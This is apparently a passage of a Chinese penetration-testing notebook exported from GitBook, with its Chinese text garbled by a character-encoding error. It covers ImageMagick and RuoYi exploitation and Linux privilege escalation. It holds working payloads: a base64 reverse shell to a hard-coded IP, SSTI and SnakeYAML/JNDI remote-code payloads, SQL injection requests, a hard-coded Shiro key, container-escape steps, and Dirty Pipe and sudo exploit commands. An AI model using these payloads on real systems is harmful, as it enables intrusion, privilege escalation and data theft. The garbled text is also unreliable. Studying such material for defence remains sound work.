L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzQ1LjMyLjQzLjQ5Lzg4ODkgMD4mMQ== | base64 -d | bash`\"||id \" )' pop graphic-context CVE-2016-3715--ä»»æ„åˆ é™¤æ–‡ä»¶ push graphic-context viewbox 0 0 640 480 image over 0,0 0,0 'ephemeral:/tmp/delete.txt' pop graphic-context CVE-2016-3716--ä»»æ„æ–‡ä»¶å†™å…¥ mslåè®®æ˜¯è¯»å–ä¸€ä¸ªmslæ ¼å¼çš„xmlæ–‡ä»¶ï¼Œå¹¶æ ¹æ®å…¶å†…å®¹æ‰§è¡Œä¸€äº›æ“ä½œ å…ˆä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡é©¬1.pngå’Œmsl.xml # msl.xmlå†…å®¹ï¼Œ1.pngé‡å‘½åä¸ºshell.php å†ä¸Šä¼ expå›¾ç‰‡ -=-=-=-=-=-=-=-=- push graphic-context viewbox 0 0 640 480 image over 0,0 0,0 'msl:msl.xml' pop graphic-context CVE-2016-3717--ä»»æ„æ–‡ä»¶è¯»å– push graphic-context viewbox 0 0 640 480 image over 0,0 0,0 'label:@/etc/hosts' pop graphic-context$ convert file_read.mvg out.png # produces file with text rendered from/etc/passwd â€‹ Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-29 17:11:58 "},"01.æ¸—é€æµ‹è¯•/05.æ¼æ´å¤ç°/è‹¥ä¾æ¼æ´å¤ç°.html":{"url":"01.æ¸—é€æµ‹è¯•/05.æ¼æ´å¤ç°/è‹¥ä¾æ¼æ´å¤ç°.html","title":"è‹¥ä¾æ¼æ´","keywords":"","body":"RuoYiä»‹ç» http://ruoyi.vip/ åŸºäºSpringBootçš„æƒé™ç®¡ç†ç³»ç»Ÿ æ˜“è¯»æ˜“æ‡‚ã€ç•Œé¢ç®€æ´ç¾è§‚ã€‚ æ ¸å¿ƒæŠ€æœ¯é‡‡ç”¨Springã€MyBatisã€Shiroæ²¡æœ‰ä»»ä½•å…¶å®ƒé‡åº¦ä¾èµ–ã€‚ è‹¥ä¾çš„ä½œè€…å°†Spring Securityæ›¿æ¢ä¸ºshiro RuoYiæ¼æ´æ¦‚è§ˆ å®˜æ–¹å¯¹å†å²æ¼æ´è¿›è¡Œäº†ç›¸å…³æ•´ç†ï¼šhttps://doc.ruoyi.vip/ruoyi/document/kslj.html#%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E æ¼æ´åç§° è®¿é—®è·¯å¾„ ç‰ˆæœ¬ Thymeleaf SSTI /monitor/cache/getNames å®šæ—¶è®¡åˆ’åå°„RCE ç³»ç»Ÿç›‘æ§â€”>å®šæ—¶ä»»åŠ¡â€”>æ·»åŠ ä»»åŠ¡->è°ƒç”¨ç›®æ ‡å­—ç¬¦ä¸² SQLæ³¨å…¥ /system/role/listã€/system/dept/edit ä»»æ„æ–‡ä»¶ä¸‹è½½ /common/download/resource Fastjson RCE /tool/gen/edit é»˜è®¤å£ä»¤ï¼šadmin/admin123 ç¯å¢ƒæ­å»º hunter web.body=\"/ruoyi/css/ry-ui.css?v=ç‰ˆæœ¬å·\" æœ¬åœ°æ­å»º ä¸‹è½½ï¼šhttps://gitee.com/y_project/RuoYi IDEAè¿æ¥æ•°æ®åº“ å‰©ä¸‹æ­¥éª¤ ä¿®æ”¹é…ç½®æ–‡ä»¶RuoYi-Vue/ruoyi-admin/src/main/resources/logback.xmlä¸­çš„æ•°æ®åº“è´¦å·å’Œå¯†ç  RuoYiæ­å»ºå¼€å‘ç¯å¢ƒ - æ˜é‡‘ Thymeleaf SSTI æœ¬è´¨ä¸Šè¿˜æ˜¯SPELè¡¨è¾¾å¼æ³¨å…¥Thymeleaf SSTIæ¼æ´åˆ†æ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com) å¤ç° POST /monitor/cache/getNames HTTP/1.1 fragment=__${T%20(java.lang.Runtime).getRuntime().exec('curl%20cn0165.dnslog.cn')}__::.x ç»•è¿‡å§¿åŠ¿ è®°ä¸€æ¬¡å®æˆ˜ä¹‹è‹¥ä¾SSTIæ³¨å…¥ç»•è¿‡ç„æŸç›¾ - å…ˆçŸ¥ç¤¾åŒº åå°å®šæ—¶ä»»åŠ¡--YAMLååºåˆ—åŒ– Javaå®‰å…¨ä¹‹SnakeYamlååºåˆ—åŒ–åˆ†æ - nice_0e3 - åšå®¢å›­ (cnblogs.com) å¤ç° é»˜è®¤å¯†ç ä¸ºadmin/admin123 è¿›å…¥åå°ç³»ç»Ÿç›‘æ§ä¸‹çš„å®šæ—¶ä»»åŠ¡åŠŸèƒ½ï¼Œå¯ä»¥å‘ç°è°ƒç”¨ç›®æ ‡å­—ç¬¦ä¸²çš„å­—æ®µã€‚ ç”Ÿæˆyamlæ¶æ„jaråŒ… https://github.com/artsploit/yaml-payload ä¿®æ”¹é¡¹ç›®æºç æ–‡ä»¶ src/artsploit/AwesomeScriptEngineFactory.java åœ¨ideaä¸­æ‰“å¼€ç»ˆç«¯ # æ‰“åŒ…ä¸ºjaråŒ… javac src/artsploit/AwesomeScriptEngineFactory.java jar -cvf yaml-payload.jar -C src/ . # å¼€å¯httpæœåŠ¡ python -m http.server 1234 åˆ›å»ºå¹¶å¼€å¯å®šæ—¶ä»»åŠ¡ org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://ip:port/yaml-payload.jar\"]]]]') org.springframework.jndi.JndiLocatorDelegate.lookup('rmi://ip:port/Evil') javax.naming.InitialContext.lookup('ldap://ip:port/#Evil') ç»“æœ ç»•è¿‡å§¿åŠ¿ æŸä¾rceé»‘åå•å¤šç§bypassæ–¹æ³•åˆ†æ - å…ˆçŸ¥ç¤¾åŒº å®šæ—¶ä»»åŠ¡åŠŸèƒ½ç‚¹ç»•è¿‡é»‘ç™½åå•æ‰§è¡Œä»»æ„sqlè¯­å¥ - å…ˆçŸ¥ç¤¾åŒº åå°SqlæŠ¥é”™æ³¨å…¥ å¤ç° åˆ†æhttps://tttang.com/archive/1712/#toc_0x2-ruoyi-461-sql POST /system/role/list HTTP/1.1 params[dataScope]=and extractvalue(1,concat(0x7e,(select user()),0x7e)) POST /system/dept/edit HTTP/1.1 DeptName=1&DeptId=100&ParentId=12&Status=0&OrderNum=1&ancestors=0)or(extractvalue(1,concat((select user()))));# shiroååºåˆ—åŒ– å‰é¢æåˆ°äº†è‹¥ä¾çš„æ ¸å¿ƒæŠ€æœ¯é‡‡ç”¨Shiroï¼Œå¦‚æœå¯†é’¥æ³„éœ²äº†ï¼Œè‡ªç„¶å°±å­˜åœ¨shiroååºåˆ—åŒ–æ¼æ´ã€‚ é»˜è®¤æ˜¯åŠ¨æ€ç”Ÿæˆå¯†é’¥ï¼Œå›ºå®šå¯†é’¥å¯ä»¥åœ¨application.ymlä¸­é…ç½®shiro.cookie.cipherKey V4.3.1~V4.6.1ï¼ŒcipherKeyä½¿ç”¨ç¡¬ç¼–ç zSyK5Kp6PZAAjlT+eeNMlg== å¤ç° åå°ä»»æ„æ–‡ä»¶ä¸‹è½½ /common/download/resource?resource=/profile/../pom.xml RuoYi-v4.7.8-RCE-POC RuoYi-v4.7.8-RCE-POC CVE-2024-42913--sqlæ³¨å…¥ https://forum.butian.net/article/585 åˆ©ç”¨å·¥å…· ç›¸å…³è·¯å¾„ /system/duplicate/check /system/fillRule/add /system/fillRule/delete /system/fillRule/deleteBatch /system/fillRule/edit /system/fillRule/executeRuleByCode /system/fillRule/exportXls /system/fillRule/importExcel /system/fillRule/list /system/fillRule/testFillRule /system/gatewayRoute/clearRedis /system/gatewayRoute/delete /system/gatewayRoute/list /system/gatewayRoute/updateAll /system/getEncryptedString /system/log/list /system/login /system/loginfo /system/logout /system/message/systemMessage/add /system/message/systemMessage/delete /system/message/systemMessage/deleteBatch /system/message/systemMessage/edit /system/message/systemMessage/list /system/message/systemMessageTemplate/add /system/message/systemMessageTemplate/delete /system/message/systemMessageTemplate/deleteBatch /system/message/systemMessageTemplate/edit /system/message/systemMessageTemplate/list /system/message/systemMessageTemplate/sendMsg /system/online/forceLogout /system/online/list /system/oss/file/delete /system/oss/file/list /system/oss/file/upload /system/permission/add /system/permission/addPermissionRule /system/permission/delete /system/systemDepartRole/deptRoleUserAdd /system/systemDepartRole/edit /system/systemDepartRole/getDeptRoleByUserId /system/systemDepartRole/getDeptRoleList /system/systemDepartRole/list /system/systemUserAgent/add /system/systemUserAgent/edit /system/systemUserAgent/queryByUserName /system/tenant/add /system/tenant/delete /system/tenant/deleteBatch /system/tenant/edit /system/tenant/list /system/tenant/queryById /system/tenant/queryList /system/third/user/checkPassword /system/third/user/create /system/thirdApp/getEnabledType /system/thirdApp/recallMessageTest /system/thirdApp/sendMessageTest /system/thirdApp/sync/dingtalk/depart /system/thirdApp/sync/dingtalk/user /system/thirdApp/sync/wechatEnterprise/depart /system/thirdApp/sync/wechatEnterprise/user /system/thirdLogin/bindingThirdPhone /system/thirdLogin/getLoginUser /system/thirdLogin/oauth2 /system/thirdLogin/render /system/upload/uploadMinio /system/user/add /system/user/addSystemUserRole /system/user/changePassword /system/user/checkOnlyUser /system/user/delete /system/user/deleteBatch /system/user/deleteRecycleBin /system/user/deleteUserInDepart /system/user/deleteUserInDepartBatch /system/user/deleteUserRole /system/user/deleteUserRoleBatch /system/user/departUserList /system/user/edit /system/user/editSystemDepartWithUser /system/user/exportXls /system/user/frozenBatch /system/user/generateUserId /system/user/getCurrentUserDeparts /system/user/getMultiUser /system/user/list /system/user/passwordChange /system/user/phoneVerification /system/user/putRecycleBin /system/user/queryByIds /system/user/queryByOrgCodeForAddressList /system/user/queryUserByDepId /system/user/queryUserComponentData /system/user/queryUserRole /system/user/recycleBin /system/user/register Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-25 23:18:14 "},"02.åæ¸—é€/Linux/Linuxæ¸—é€.html":{"url":"02.åæ¸—é€/Linux/Linuxæ¸—é€.html","title":"Linuxæ¸—é€æ€»ç»“","keywords":"","body":"åˆ¤æ–­æ˜¯å¦ä¸ºè™šæ‹Ÿæœº systemd-detect-virt è¿”å›Noneåˆ™è¯´æ˜æ˜¯ç‰©ç†æœº whereis vmtoolsd å®¹å™¨é€ƒé€¸ å¦‚ä½•åˆ¤æ–­æ˜¯å¦åœ¨dockerå®¹å™¨å†… ls -al /.dockerenv cat /proc/1/cgroup dockerå®¹å™¨é€ƒé€¸æ£€æµ‹è„šæœ¬teamssix/container-escape-check: docker container escape check || Docker å®¹å™¨é€ƒé€¸æ£€æµ‹ (github.com) å¸¸è§é€ƒé€¸æ–¹æ³• Docker ä»‹ç» | T Wiki Docker Remote API æœªæˆæƒé€ƒé€¸ docker remote apiå¯ä»¥æ‰§è¡Œdockerå‘½ä»¤ï¼Œdockerå®ˆæŠ¤è¿›ç¨‹ç›‘å¬åœ¨0.0.0.0ï¼Œå¯ç›´æ¥è°ƒç”¨APIæ¥æ“ä½œdockerã€‚ Privileged ç‰¹æƒæ¨¡å¼å®¹å™¨é€ƒé€¸ sudo docker run -itd --privileged ubuntu:latest /bin/bash # ä½¿ç”¨ç‰¹æƒæ¨¡å¼å¯åŠ¨å®¹å™¨ fdisk -l # æŸ¥çœ‹ç£ç›˜æ–‡ä»¶ mkdir /tmp/test # åˆ›å»ºæŒ‚è½½ç›®å½• mount /dev/sda1 /tmp/test # å°†å®¿ä¸»æœºç£ç›˜æŒ‚è½½åˆ°æŒ‚è½½ç›®å½• chroot /tmp/test # åˆ‡æ¢æ ¹ç›®å½• æ•æ„Ÿç›®å½•æŒ‚è½½é€ƒé€¸ df # æ˜¾ç¤ºæ–‡ä»¶ç³»ç»Ÿçš„ç£ç›˜ç©ºé—´ä½¿ç”¨æƒ…å†µï¼ŒåŒ…æ‹¬æ–‡ä»¶ç³»ç»Ÿçš„æŒ‚è½½ç‚¹ ä»¥æŒ‚è½½äº†å®¿ä¸»æœº/rootåˆ°å®¹å™¨/rootä¸ºä¾‹ å®¿ä¸»æœºå†…æ ¸æ¼æ´å¯¼è‡´é€ƒé€¸ CVE-2016-5195å®éªŒï¼šDirtyCoWä¸Dockeré€ƒé€¸ (wohin.me) Pyaloadï¼šscumjr/dirtycow-vdso: PoC for Dirty COW (CVE-2016-5195) (github.com) make ./0xdeadbeef 172.18.0.2:10000 ç”±äºæœ€åè·å¾—çš„äº‹å®ä¸Šæ˜¯ä¸€ä¸ªåå¼¹shellï¼Œæ‰€ä»¥è¦ç»™å‡ºåå¼¹çš„IPå’Œç«¯å£ã€‚ç«¯å£å¯ä»¥éšæ„è®¾ç½®ï¼ŒIPå¯ä»¥ç”¨ifconfigæŸ¥çœ‹ã€‚ é›†æˆå·¥å…· CDK Home CN Â· cdk-team/CDK Wiki (github.com) CDKåŒ…æ‹¬ä¸‰ä¸ªåŠŸèƒ½æ¨¡å— Evaluate: å®¹å™¨å†…éƒ¨ä¿¡æ¯æ”¶é›†ï¼Œä»¥å‘ç°æ½œåœ¨çš„å¼±ç‚¹ä¾¿äºåç»­åˆ©ç”¨ã€‚ Exploit: æä¾›å®¹å™¨é€ƒé€¸ã€æŒä¹…åŒ–ã€æ¨ªå‘ç§»åŠ¨ç­‰åˆ©ç”¨æ–¹å¼ã€‚ Tool: ä¿®å¤æ¸—é€è¿‡ç¨‹ä¸­å¸¸ç”¨çš„linuxå‘½ä»¤ä»¥åŠä¸Docker/K8s APIäº¤äº’çš„å‘½ä»¤ã€‚ è¡¥å…… teamssix/awesome-cloud-security: awesome cloud security æ”¶é›†ä¸€äº›å›½å†…å¤–ä¸é”™çš„äº‘å®‰å…¨èµ„æºï¼Œè¯¥é¡¹ç›®ä¸»è¦é¢å‘å›½å†…çš„å®‰å…¨äººå‘˜ (github.com)https://github.com/source-xu/docker-vuls) ä¸€ä¸ªæœªå…¬å¼€çš„å®¹å™¨é€ƒé€¸æ–¹å¼ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ· Linuxææƒ https://mp.weixin.qq.com/s/tl1Qf1RukOBOcjp4PMXn_w Getshell/LinuxTQ: ã€ŠLinuxææƒæ–¹æ³•è®ºã€‹ https://github.com/Getshell/LinuxTQ è¾…åŠ©å·¥å…· GTFOBins GTFOBinsæ˜¯ä¸€ä¸ªç²¾å¿ƒç­–åˆ’çš„UnixäºŒè¿›åˆ¶æ–‡ä»¶åˆ—è¡¨ï¼Œå¯ä»¥ç”¨æ¥ç»•è¿‡é”™è¯¯é…ç½®ç³»ç»Ÿä¸­çš„æœ¬åœ°å®‰å…¨é™åˆ¶ã€‚è¯¥é¡¹ç›®æ”¶é›†äº†UnixäºŒè¿›åˆ¶æ–‡ä»¶çš„åˆæ³•å‡½æ•°ï¼Œè¿™äº›å‡½æ•°å¯èƒ½è¢«æ»¥ç”¨ï¼Œä»¥æ‰“ç ´å—é™åˆ¶çš„shellï¼Œå‡çº§æˆ–ç»´æŠ¤æå‡çš„ç‰¹æƒï¼Œä¼ è¾“æ–‡ä»¶ï¼Œç”Ÿæˆç»‘å®šå’Œåå‘shellï¼Œå¹¶ä¸ºå…¶ä»–äº‹ååˆ©ç”¨ä»»åŠ¡æä¾›ä¾¿åˆ©ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸æ˜¯ä¸€ä¸ªæ¼æ´åˆ—è¡¨ï¼Œè¿™é‡Œåˆ—å‡ºçš„ç¨‹åºæœ¬èº«å¹¶ä¸å®¹æ˜“å—åˆ°æ”»å‡»ï¼Œç›¸åï¼ŒGTFOBinsæ˜¯ä¸€ä¸ªæ¦‚è¦ï¼Œè¯´æ˜å½“æ‚¨åªæœ‰æŸäº›äºŒè¿›åˆ¶æ–‡ä»¶å¯ç”¨æ—¶ï¼Œå¦‚ä½•è·å¾—rootæƒé™ã€‚ beroot BeRootç”¨äºæ£€æŸ¥Linuxå’ŒMac OSä¸Šå¸¸è§çš„é”™è¯¯é…ç½®ï¼Œä»¥æ‰¾åˆ°ä¸€ç§æ–¹æ³•æ¥å‡çº§æˆ‘ä»¬çš„ç‰¹æƒã€‚æ£€æŸ¥é¡¹åŒ…æ‹¬GTFOBinsä¸­çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€é€šé…ç¬¦é”™è¯¯ã€suidã€ç¯å¢ƒå˜é‡ã€NFSã€sudoç­‰ç­‰ python2 beroot.py Linepeas--ä¸åªæ˜¯ææƒ LinPEAS æ˜¯ä¸€ä¸ªè„šæœ¬ï¼Œç”¨äºæœç´¢åœ¨ Linux/Unix*/MacOS ä¸»æœºä¸Šæå‡æƒé™çš„å¯èƒ½è·¯å¾„ã€‚https://github.com/peass-ng wget https://github.com/peass-ng/PEASS-ng/releases/download/20241101-6f46e855/linpeas.sh å¯å°è¯•åˆ©ç”¨çš„ç»“æœé¢œè‰²ï¼Œçº¢å­—é»„åº•ï¼ˆ99% sureï¼‰å’Œçº¢å­— å‚æ•°é€‰é¡¹ -o (ä»…æ‰§è¡Œé€‰å®šçš„æ£€æŸ¥)ï¼š ä»…æ‰§è¡ŒæŒ‡å®šçš„æ£€æŸ¥é¡¹ç›®ã€‚å¯ä»¥é€‰æ‹©å¤šä¸ªé¡¹ç›®ï¼Œç”¨é€—å·åˆ†éš”ã€‚ ä¾‹å¦‚ï¼š-o system_information,procs_crons_timers_srvcs_sockets,interesting_files å¯é€‰çš„æ£€æŸ¥é¡¹ç›®åŒ…æ‹¬ï¼š system_informationï¼šç³»ç»Ÿä¿¡æ¯ containerï¼šå®¹å™¨ cloudï¼šäº‘ç¯å¢ƒ procs_crons_timers_srvcs_socketsï¼šè¿›ç¨‹ã€è®¡åˆ’ä»»åŠ¡ã€å®šæ—¶å™¨ã€æœåŠ¡ã€å¥—æ¥å­— network_informationï¼šç½‘ç»œä¿¡æ¯ users_informationï¼šç”¨æˆ·ä¿¡æ¯ software_informationï¼šè½¯ä»¶ä¿¡æ¯ interesting_filesï¼šæœ‰è¶£çš„æ–‡ä»¶ api_keys_regexï¼šAPI å¯†é’¥æ­£åˆ™è¡¨è¾¾å¼ -r (å¯ç”¨æ­£åˆ™è¡¨è¾¾å¼æ£€æŸ¥)ï¼š å¯ç”¨æ­£åˆ™è¡¨è¾¾å¼æ£€æŸ¥ï¼Œè¿™å¯èƒ½ä¼šèŠ±è´¹å‡ åˆ†é’Ÿåˆ°å‡ å°æ—¶çš„æ—¶é—´ã€‚ -P (æŒ‡å®šå¯†ç )ï¼š æŒ‡å®šä¸€ä¸ªå¯†ç ï¼Œç”¨äºè¿è¡Œ sudo -l å’Œé€šè¿‡ su æš´åŠ›ç ´è§£å…¶ä»–ç”¨æˆ·è´¦æˆ·ã€‚ -N (ä¸ä½¿ç”¨é¢œè‰²)ï¼š ä¸ä½¿ç”¨é¢œè‰²é«˜äº®æ˜¾ç¤ºç»“æœã€‚ ç½‘ç»œä¾¦å¯Ÿ -t (è‡ªåŠ¨ç½‘ç»œæ‰«æå’Œäº’è”ç½‘è¿æ¥æ£€æŸ¥)ï¼š è‡ªåŠ¨è¿›è¡Œç½‘ç»œæ‰«æå’Œäº’è”ç½‘è¿æ¥æ£€æŸ¥ï¼Œå¹¶å°†ç»“æœå†™å…¥æ–‡ä»¶ã€‚ -d (å‘ç°ä¸»æœº)ï¼š ä½¿ç”¨ fping æˆ– ping å‘ç°æŒ‡å®šç½‘æ®µå†…çš„ä¸»æœºã€‚ ä¾‹å¦‚ï¼š-d 192.168.0.1/24 -p (å‘ç°å¼€æ”¾ç«¯å£)ï¼š ç»“åˆ -d é€‰é¡¹ï¼Œå‘ç°æŒ‡å®šç½‘æ®µå†…ä¸»æœºçš„å¼€æ”¾ç«¯å£ã€‚ é»˜è®¤æ‰«æç«¯å£ 22, 80, 443, 445, 3389ï¼Œä¹Ÿå¯ä»¥æŒ‡å®šå…¶ä»–ç«¯å£ã€‚ ä¾‹å¦‚ï¼š-d 192.168.0.1/24 -p 53,139 -i (æ‰«æå•ä¸ªIP)ï¼š ä½¿ç”¨ nc æ‰«ææŒ‡å®šçš„å•ä¸ªIPåœ°å€ã€‚ é»˜è®¤æ‰«æ nmap çš„å‰1000ä¸ªç«¯å£ï¼Œä¹Ÿå¯ä»¥æŒ‡å®šå…¶ä»–ç«¯å£ã€‚ ä¾‹å¦‚ï¼š-i 127.0.0.1 -p 53,80,443,8000,8080 ç«¯å£è½¬å‘ -F (ç«¯å£è½¬å‘)ï¼š å°†æœ¬åœ°IPå’Œç«¯å£è½¬å‘åˆ°è¿œç¨‹IPå’Œç«¯å£ã€‚ ä¾‹å¦‚ï¼š-F 127.0.0.1:8080:192.168.1.1:80 pspy--è¿›ç¨‹ç›‘æ§ Pspyæ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œç”¨äºåœ¨ä¸éœ€è¦rootæƒé™çš„æƒ…å†µä¸‹çª¥æ¢è¿›ç¨‹ã€‚è¯¥å·¥å…·é€šå…³å¾ªç¯éå†/procä¸‹çš„å€¼æ¥è·å–è¿›ç¨‹å‚æ•°ä¿¡æ¯ã€‚æ¯”å¦‚è¯´æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°ä¸€äº›å®šæ—¶ä»»åŠ¡è¿›ç¨‹æˆ–å…¶ä»–å¯ç–‘è¿›ç¨‹æ¥å°è¯•ææƒ ./pspy64 traior--è‡ªåŠ¨åŒ–ææƒğŸ‚ å¤šä¸ªlinuxææƒæ¼æ´ç¼åˆæ€ªï¼Œè¿è¡Œåä¼šç»™å‡ºææƒæ–¹æ³•ï¼Œå¹¶å†…ç½®äº†expå¯ä»¥ç›´æ¥ä½¿ç”¨ å¸¸è§ææƒæ‰‹æ³• å†…æ ¸ææƒ å¼ºè°ƒåˆ©ç”¨å†…æ ¸æ¼æ´çš„å‡ ä¸ªæ³¨æ„ç‚¹ï¼š è¯»æºç æ³¨é‡Šï¼Œæœ‰expåŸºæœ¬ä¿¡æ¯å’Œç¼–è¯‘æ–¹æ³•ï¼Œä¸ç„¶å¯èƒ½è¿ç¼–è¯‘éƒ½ä¸ä¼š è¯»æºç ï¼Œä¸ç„¶è´¹åŠ²ç¼–è¯‘å®Œæ‰å‘ç°ä¸é€‚ç”¨ è¯»æºç ï¼Œä¸ç„¶é‡åˆ°ä¸€ä¸ªåˆ å…¨ç›˜çš„â€expâ€œæ€ä¹ˆåŠ é‡åˆ°æ²¡æœ‰gccçš„å‘çˆ¹æœåŠ¡å™¨ã€‚è¿™æ—¶æˆ‘ä»¬å°±éœ€è¦åœ¨æœ¬åœ°ç¼–è¯‘ã€‚æœ¬åœ°ç¼–è¯‘æ—¶ä¸æ­¢è¦çœ‹expæºç æ³¨é‡Šçš„ç¼–è¯‘å‚æ•°ï¼Œä¹Ÿéœ€è¦æ‰‹åŠ¨è°ƒæ•´ä¸€ä¸‹ç¼–è¯‘çš„å‚æ•°ï¼Œæ¯”å¦‚ç»™gcc åŠ -m 32æ¥ç¼–è¯‘32ä½ã€‚ç¼–è¯‘é—®é¢˜ç¹å¤šï¼Œæœ‰å›°éš¾æ‰¾è°·æ­Œã€‚ è„ç‰›æ¼æ´ï¼ˆCVE-2016-5195ï¼‰ æ¼æ´åŸç†ï¼šè¯¥æ¼æ´å…·ä½“ä¸ºï¼Œget_user_pageå†…æ ¸å‡½æ•°åœ¨å¤„ç†Copy-on-Write(ä»¥ä¸‹ä½¿ç”¨COWè¡¨ç¤º)çš„è¿‡ç¨‹ä¸­ï¼Œå¯èƒ½äº§å‡ºç«æ€æ¡ä»¶é€ æˆCOWè¿‡ç¨‹è¢«ç ´åï¼Œå¯¼è‡´å‡ºç°å†™æ•°æ®åˆ°è¿›ç¨‹åœ°å€ç©ºé—´å†…åªè¯»å†…å­˜åŒºåŸŸçš„æœºä¼šã€‚ä¿®æ”¹suæˆ–è€…passwdç¨‹åºå°±å¯ä»¥è¾¾åˆ°rootçš„ç›®çš„ã€‚ PoCs Â· dirtycow/dirtycow.github.io Wiki Dirty Pipe(CVE-2022-0847) https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit è¦†ç›– /etc/passwd ä¸­çš„ root å¯†ç å­—æ®µå¹¶åœ¨å¼¹å‡º root shell åæ¢å¤ https://haxx.in/files/dirtypipez.c ç›´æ¥ä¿®æ”¹ä¸€ä¸ªå…·æœ‰suidæƒé™çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œç„¶åæ‰§è¡Œè¿™ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ææƒï¼Œå®Œæˆææƒåå†æŠŠæ–‡ä»¶æ”¹å›æ¥ wget https://haxx.in/files/dirtypipez.c gcc -o dirtypipez dirtypipez.c ./dirtypipez /usr/bin/su #ä»»ä½•å…·ä½“suidæƒé™çš„æ–‡ä»¶å‡å¯ Dockerææƒ ä»è„ç®¡é“ï¼ˆCVE-2022-0847ï¼‰åˆ° Docker é€ƒé€¸ CVE-2022-23222--ä¸ç¨³å®š å½±å“ç‰ˆæœ¬ï¼š5.8.0 https://github.com/tr3ee/CVE-2022-23222.git Docker ç”¨æˆ·ç»„ææƒ Docker ç”¨æˆ·ç»„ææƒ | T Wiki suidææƒ è°ˆä¸€è°ˆLinuxä¸suidææƒ | ç¦»åˆ«æ­Œ (leavesongs.com) suidå…¨ç§°æ˜¯Set owner User ID up on executionã€‚è¿™æ˜¯Linuxç»™å¯æ‰§è¡Œæ–‡ä»¶çš„ä¸€ä¸ªå±æ€§ã€‚ è®¾ç½®äº†sä½çš„ç¨‹åºåœ¨è¿è¡Œæ—¶ï¼Œå…¶Effective UIDå°†ä¼šè®¾ç½®ä¸ºè¿™ä¸ªç¨‹åºçš„æ‰€æœ‰è€…ã€‚æ¯”å¦‚ï¼Œ/bin/pingè¿™ä¸ªç¨‹åºçš„æ‰€æœ‰è€…æ˜¯0ï¼ˆrootï¼‰ï¼Œå®ƒè®¾ç½®äº†sä½ï¼Œé‚£ä¹ˆæ™®é€šç”¨æˆ·åœ¨è¿è¡Œpingæ—¶å…¶Effective UIDå°±æ˜¯0ï¼Œç­‰åŒäºæ‹¥æœ‰äº†rootæƒé™ã€‚ æŸ¥æ‰¾å…·æœ‰sä½æƒé™çš„å‘½ä»¤ find / -user root -perm -4000 -print 2>/dev/null find / -perm -u=s -type f 2>/dev/null find / -user root -perm -4000 -exec ls -ldb {} ; å¸¸è§suidææƒå‘½ä»¤ find . -exec command \\; ./vim -c ':python3 import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")' sudoææƒ sudoï¼šsuper user do ä¸æ°å½“çš„sudoå‘½ä»¤é…ç½® åŸç†ï¼š åœ¨äº¤äº’æ¨¡å¼ä»¥åŠæ— å¯†ç æƒ…å†µä¸‹ï¼ˆçŸ¥é“å¯†ç ç›´æ¥åˆ‡æ¢ä¸ºrootç”¨æˆ·å°±å¥½äº†ï¼‰å¯ä»¥ä½¿ç”¨sudo -læŸ¥æ‰¾å“ªäº›å‘½ä»¤å¯ä»¥ä»¥rootæƒé™æ‰§è¡Œï¼Œä½¿ç”¨è¿™äº›å‘½ä»¤åˆ›å»ºä¸€ä¸ªæ–°shellå³å¯ææƒ åœ¨viçš„ESCæ¨¡å¼ä¸‹è¾“å…¥!/bin/bashåæŒ‰ä¸‹å›è½¦å³å¯å˜ä¸ºrootæƒé™ã€‚ Linux sudoæƒé™æå‡æ¼æ´ï¼ˆCVE-2021-3156ï¼‰-- æˆåŠŸç‡é«˜ æŸ¥çœ‹sudoç‰ˆæœ¬ sudo --version ç‰ˆæœ¬å½±å“ sudo 1.8.2 - 1.8.31p2 sudo 1.9.0 - 1.9.5p1 ç®€å•åˆ¤æ–­æ–¹æ³• sudoedit -s / å¦‚æœæ˜¾ç¤ºsudoedit: /: not a regular fileï¼Œåˆ™è¡¨ç¤ºè¯¥æ¼æ´å­˜åœ¨ EXPä½¿ç”¨ https://github.com/worawit/CVE-2021-3156 å¯¹äº glibc æ”¯æŒå¹¶å¯ç”¨äº† tcache çš„ Linux å‘è¡Œç‰ˆï¼ˆCentOS 8ã€Ubuntu >= 17.10ã€Debian 10ï¼‰ exploit_nss.pyâ†’exploit_timestamp_race.c å¯¹äº glibc ä¸æ”¯æŒ tcache çš„ Linux å‘è¡Œç‰ˆï¼ˆDebian 9, Ubuntu 16.04, or Ubuntu 14.04ï¼‰ exploit_nss_xxx.pyâ†’exploit_defaults_mailer.pyâ†’exploit_userspec.py blasty/CVE-2021-3156 (github.com) make ./sudo-hax-me-a-sandwich num # é€‰æ‹©åˆé€‚çš„åºå· ç¯å¢ƒå˜é‡ææƒ æœ¬è´¨ä¸Šè¿˜æ˜¯suidææƒï¼Œåªä¸è¿‡å…·æœ‰suidæƒé™çš„å‘½ä»¤æ˜¯ç”¨æˆ·è‡ªå®šä¹‰çš„ï¼Œè°ƒç”¨äº†å…¶ä»–å‘½ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åŠ«æŒè°ƒç”¨çš„å…¶ä»–å‘½ä»¤æ¥ææƒã€‚ æ¯”å¦‚æœ‰ä¸€ä¸ªrootç”¨æˆ·è‡ªå®šä¹‰çš„å…·æœ‰suidæƒé™çš„testå‘½ä»¤ï¼Œè°ƒç”¨äº†ç³»ç»Ÿå‘½ä»¤lsï¼Œé‚£æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªå¯å†™ç›®å½•ï¼Œé€šè¿‡ä¿®æ”¹$PATHç¯å¢ƒå˜é‡ï¼ŒåŠ«æŒlså‘½ä»¤ã€‚ 